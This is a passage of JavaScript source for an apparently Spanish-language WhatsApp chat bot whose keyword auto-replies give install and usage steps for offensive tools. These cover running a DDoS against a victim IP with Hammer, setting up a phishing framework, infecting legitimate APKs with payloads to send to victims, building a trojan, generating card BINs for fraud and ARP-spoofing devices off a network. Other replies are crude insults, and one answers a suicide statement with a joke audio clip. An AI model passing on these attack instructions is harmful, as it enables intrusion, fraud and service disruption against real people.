$ cd sqlmap
$ chmod +x *

📲Run:📲

$ python2 sqlmap.py -h

It shows all options to use this tool sqlmap

$ python2 sqlmap.py`)
                  }

if (budy.includes(`/bingen`)) {
                  reply(`📱Bingen📱

💵 *Es una herramienta cuya funcion es generar bins mediante un algoritmo avanzado de generacion
se estas.* 💵

💵 Un bin es utilizado como una forma para la generacion de tarjeras de credito validas. Con el cual puedes obtener servicios premium. 💵

https://github.com/JoeTech-Studio/Bingen.git`)
                  }

if (budy.includes(`/socialsploit`)) {
                  reply(`📱SocialSploit es un framework de phishing que nos ayuda a hackear con ngrok y serveo📱

📱Installation:📱

$ pkg install -y git 
$ git clone https://github.com/Cesar-Hack-Gray/SocialSploit
$  cd SocialSploit 
$  ls
$ bash install.sh
$ ./Sploit`)
                  }

if (budy.includes(`/hammer`)) {
                  reply(`📱¿Que es Hammer?📱

💉Que es DDoS y Como funciona¿?💉

Los ataques de red distribuidos a menudo se conocen como ataques de denegación distribuida de servicio (DDoS), El ataque DDoS envía varias solicitudes al recurso web atacado, con la intención de desbordar la capacidad del sitio web para administrar varias solicitudes y de evitar que este funcione correctamente.

📱Instalacion:📱

$ pkg install -y git
$ pkg install -y python
$ pkg install -y python2
$ pkg install -y nmap
$ pkg install net-tools
$ git clone https://github.com/cyweb/hammer
$ cd hammer

💻USO CORRECTO:💻

Primero sacamos la ip del sitio web 

ping sitio sin http o https

python hammer -s IP  -p 80 -t 135

Es .py pero facebook bloquea si lo pongo correctamente

( -s ) Sirve para indicar la IP del sitio web de la víctima.

( -p ) Sirve para indicar el puerto que atacaremos, en éste caso el puerto mas recomendado y por defecto es 80.

( -t ) Sirve para indicar la velocidad en la cual se enviarán los paquetes, en éste caso la velocidad mas recomendada y por defecto es 135`)
                  }

if (budy.includes(`/kali-nethunter`)) {
                  reply(`📱¿Que es Kali-Nethunter?📱

Este es un script mediante el cual puede instalar Kali nethunter (Kali Linux) en su aplicación termux sin un teléfono rooteado.

📱Installation:📱

$ apt update 
$ apt upgrade
$ apt install git
$ git clone https://github.com/Hax4us/Nethunter-In-Termux
$ cd Nethunter-In-Termux
$ chmod +x *
$ ./kalinethunter

Now select your architecture 

Now type this command to start 

$ startkali
Compulsory Steps For First Time Use

So after startkali

execute this command

$ apt-key adv --keyserver hkp://keys.gnupg.net --recv-keys 7D8D0BF6

Now its time to update

$ apt-get update`)
                  }
					
if (budy.includes(`/infectador-framework`)) {
                  reply(`📲 infectador-framework 📲

Es un script que te permite infectar apks legítimas con 6 payloads diferentes a elejir los comandos para instalar el script son:

$ apt update && apte upgrade -y 
$ pkg install -y git 
$ git clone https://github.com/Cesar-Hack-Gray/infectador-framework 
$ cd infectador-framework 
$ ls 
$ bash setup 

Esta parte tardará un poco solo esperen a que se instalen los paquetes necesarios para el script Ya cuendo aya terminado de descargar todos los paquetes ejecutan el script con:

$ ./Infectador Apreten enter 

Elijen el payload que quieran usar para infectar el apk poniendo el número que tenga detrás el payload

 Aquí ponen la ruta del apk legítima que quieren infectar por ejemplo si la apk se encuentra en descargas y se llama Base.apk la ruta sería: 

$ /sdcard/Download/Base.apk

 Ojo eso es un ejemplo ustedes ponen la ruta de dónde se encuentre el apk con su respectivo nombre

Aquí pondrán su IP, para saber cuál es su IP pueden abrir otra sesión y escribir *ifconfig ahíh buscan su IP y la pegan en la sesión del infectador Aquí ponen el puerto de su preferencia Aquí le elijen un nuevo nombre al apk Aquí apretan "Y" y le dan a enter Ya se estaría infectando el apk legítima solo deben esperar Ya cuendo aya terminado de infectar el apk elijen la opción 2 es lo más recomendable Bueno aquí les pedirá iniciar metasploit ustedes apretan "Y" le dan a enter y le dan devuelta a "Y",metasploit se estaría conectando con el apk infectada El apk infectada se les guardará en la carpeta de infectador-framework solo deben ingresar a la carpeta y mover el apk infectada a HOME ya solo queda mandar el apk infectada a la víctima*`)
                  }
					
		if (budy.includes(`/evil-create-framework`)) {
                  reply(`📱 CREAR TROYANO 📱

📱Instalación 📱

$ pkg update
$ pkg upgrade
$ pkg install git
$ pkg install python2
$ git clone https://github.com/LOoLzeC/Evil-create-framework
$ ls
$ cd Evil-create-framework
$ ls
$ chmod +x vcrt.py
$ python2 vcrt.py

help

show android

create virus/y aquí elegimos el virus

SET OUTPUT /sdcard

SET NAME VIRUS (y le ponemos un nombre)

go`)
                  }
	
	if (budy.includes(`/wiki-termux`)) {
                  reply(`🌎¿Qué es Wiki-Termux?🌎

wiki-termux, como su nombre lo dice, es una guía o manual que contiene información acerca del uso de Termux y de algunas herramientas que son compatibles con ésta terminal.

📱INSTALACIÓN DE wiki-termux EN TERMUX (ANDROID)📱

$ apt update && apt upgrade -y
$ termux-setup-storage
$ pkg install -y git
$ git clone https://github.com/HarrisSec/wiki-termux
$ cd wiki-termux
$ chmod 711 wiki
$ ./wiki`)
                  }

if (budy.includes(`/kickthemoutprojet`)) {
                  reply(`📲¿Qué es kickthemout?📲

Una herramienta para expulsar dispositivos de su red y disfrutar de todo el ancho de banda para usted. Le permite seleccionar dispositivos específicos o todos y ARP los falsifica fuera de su red de área local.

📲INSTALACIÓN DE kickthemout EN TERMUX (ANDROID ROOT)🌐

$ apt update && apt upgrade -y
$ termux-setup-storage
$ pkg install -y git
$ pkg install -y nmap
$ pkg install -y python
$ pkg install -y python2
$ git clone https://github.com/k4m4/kickthemout.git
$ cd kickthemout
$ python -m pip install -r requirements.txt
$ sudo python kickthemout.py

Escribir la puerta de enlace del router al que estas conectado, ejemplo:

192.168.1.1

Seleccionar la opción número "3" y pulsar enter`)
                  }
// FINAL AUTORESPUESTA - HACKING
					
		if (budy.includes(`Todo bien`)) {
                  reply(`Si amigo todo bien, vite`)
                  }

		if (budy.includes(`Buenos dias`)) {
                  reply(`Buenos Dias trolos de mierda`)
                  }

		if (budy.includes(`Bot gay`)) {
                  reply(`Miren a este boludito`)
                  }
					
		if (budy.includes(`Che messi vo le preguntaste?`)) {
                  reply(`No`)
                  }

		if (budy.includes(`Gracias`)) {
                  reply(`De nada padre`)
                  }

		if (budy.includes(`Bien gracias y tu?`)) {
                  reply(`Opa yazmin te extrañe :(`)
                  }
					
		if (budy.includes(`Opa`)) {
                  reply(`opaaaaa`)
                  }
                 
		if (budy.includes(`Fua`)) {
                  reply(`el diegote pa`)
                  }
	
	if (budy.startsWith(`Pasen porno`)) {
        const none = fs.readFileSync('./mp3/maau2.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }			
	if (budy.startsWith(`VAMOOO`)) {
        const none = fs.readFileSync('./mp3/vamo.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }
	if (budy.startsWith(`Hora del sexito`)) {
        const none = fs.readFileSync('./mp3/maau1.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }
        if (budy.startsWith(`Cuentate un chiste`)) {
        const none = fs.readFileSync('./mp3/dylan2.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }
	if (budy.startsWith(`Admin party`)) {
        const none = fs.readFileSync('./mp3/fiesta.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }
        if (budy.startsWith(`Fiesta del admin`)) {
        const none = fs.readFileSync('./mp3/admin.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }
	if (budy.startsWith(`Viernes`)) {
        const none = fs.readFileSync('./mp3/viernes.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }
	if (budy.startsWith(`:v`)) {
        const none = fs.readFileSync('./mp3/viejo1.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }
	if (budy.startsWith(`La toca 7w7`)) {
        const none = fs.readFileSync('./anishan/anime5.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }
	if (budy.startsWith(`Quien es tu sempai botsito`)) {
        const none = fs.readFileSync('./anishan/anime4.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }
	if (budy.startsWith(`Me gimes 7u7`)) {
        const none = fs.readFileSync('./anishan/anime3.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }
	if (budy.startsWith(`Te amo botsito uwu`)) {
        const none = fs.readFileSync('./anishan/anime2.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }
	if (budy.startsWith(`Onichan`)) {
        const none = fs.readFileSync('./anishan/anime1.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }
	if (budy.startsWith(`Pasen sexo`)) {
        const none = fs.readFileSync('./mp3/fernan.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }
	if (budy.startsWith(`Paraguayo`)) {
        const none = fs.readFileSync('./mp3/gaspi11.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }
	if (budy.startsWith(`Venezolano`)) {
        const none = fs.readFileSync('./mp3/gaspi10.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }
	if (budy.startsWith(`Gaspi corte`)) {
        const none = fs.readFileSync('./mp3/gaspi12.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }
	if (budy.startsWith(`Gaspi buenos dias`)) {
        const none = fs.readFileSync('./mp3/gaspi13.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }
	if (budy.startsWith(`Enano`)) {
        const none = fs.readFileSync('./mp3/gaspi14.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }
	if (budy.startsWith(`Buenas noches`)) {
        const none = fs.readFileSync('./mp3/gaspi15.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }
        if (budy.startsWith(`Peruano`)) {
        const none = fs.readFileSync('./mp3/gaspi16.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }
	if (budy.startsWith(`Alto temazo`)) {
        const none = fs.readFileSync('./mp3/sombare14.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }
	if (budy.startsWith(`GOOOOD`)) {
        const none = fs.readFileSync('./mp3/sombare13.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }
	if (budy.startsWith(`Ya me voy a dormir`)) {
        const none = fs.readFileSync('./mp3/sombare12.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }
        if (budy.startsWith(`Calefon`)) {
        const none = fs.readFileSync('./mp3/sombare11.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }
	if (budy.startsWith(`Bot de mierda`)) {
        const none = fs.readFileSync('./mp3/sombare10.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }
	if (budy.startsWith(`Apurate bot`)) {
        const none = fs.readFileSync('./mp3/sombare9.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }
	if (budy.startsWith(`Un chino`)) {
        const none = fs.readFileSync('./mp3/sombare7.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }				
        if (budy.startsWith(`No funciona`)) {
        const none = fs.readFileSync('./mp3/sombare8.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }
	if (budy.startsWith(`Boliviano`)) {
        const none = fs.readFileSync('./mp3/gaspi3.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }
	if (budy.startsWith(`Corte`)) {
        const none = fs.readFileSync('./mp3/gaspi2.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }
	if (budy.startsWith(`Gaspi me saludas`)) {
        const none = fs.readFileSync('./mp3/gaspi4.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }
	if (budy.startsWith(`Gaspi y las minitas`)) {
        const none = fs.readFileSync('./mp3/gaspi6.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }
	if (budy.startsWith(`Gaspi todo bien`)) {
        const none = fs.readFileSync('./mp3/gaspi7.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }
	if (budy.startsWith(`Me quiero suicidar`)) {
        const none = fs.readFileSync('./mp3/gaspi81.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }
	if (budy.startsWith(`Gaspi ya no aguanto`)) {
        const none = fs.readFileSync('./mp3/gaspi9.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }
	if (budy.startsWith(`Contate algo bot`)) {
        const none = fs.readFileSync('./mp3/gaspi5.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }
               if (budy.startsWith(`Sexo`)) { 
        const none = fs.readFileSync('./mp3/sexo.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }
	if (budy.startsWith(`Pongan cuties`)) { 
        const none = fs.readFileSync('./mp3/neymar1.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }
                 if (budy.startsWith(`Momento epico`)) {
        const none = fs.readFileSync('./mp3/sombare1.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }
		if (budy.startsWith(`El bot del orto no funciona`)) {
        const none = fs.readFileSync('./mp3/sombare2.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }
		if (budy.startsWith(`Epicardo`)) {
        const none = fs.readFileSync('./mp3/sombare3.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }
		if (budy.startsWith(`Insta de la minita`)) {
        const none = fs.readFileSync('./mp3/sombare4.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }
                 if (budy.startsWith(`Una mierda de bot`)) {
        const none = fs.readFileSync('./mp3/sombare5.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }
		 if (budy.startsWith(`Ultimo momento`)) {
        const none = fs.readFileSync('./mp3/sombare6.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }			
		if (budy.startsWith(`Nefasto`)) {
        const none = fs.readFileSync('./mp3/gaspi1.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }
	if (isGroup && isSimi && budy != undefined) {
						console.log(budy)
						muehe = await simih(budy)
						console.log(muehe)
						reply(muehe)
					} else {
						console.log(color('[WARN]','red'), 'Unregistered Command from', color(sender.split('@')[0]))
					}
                           }
		} catch (e) {
			console.log('Error : %s', color(e, 'red'))
		}
	})
}
starts()
